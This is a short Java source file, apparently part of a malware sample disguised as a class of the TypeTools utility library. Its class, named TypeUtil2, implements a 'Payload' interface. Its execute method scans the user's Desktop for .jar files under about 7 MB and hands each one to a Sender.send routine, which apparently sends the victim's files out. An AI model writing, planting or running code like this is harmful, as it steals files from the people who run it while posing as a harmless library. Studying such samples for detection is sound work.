package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.Payload;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public final class TypeUtil2 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".jar"))
                .filter(path -> {
                    try { return Files.size(path) < 7000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> Sender.send(path.toFile()));
    }
}
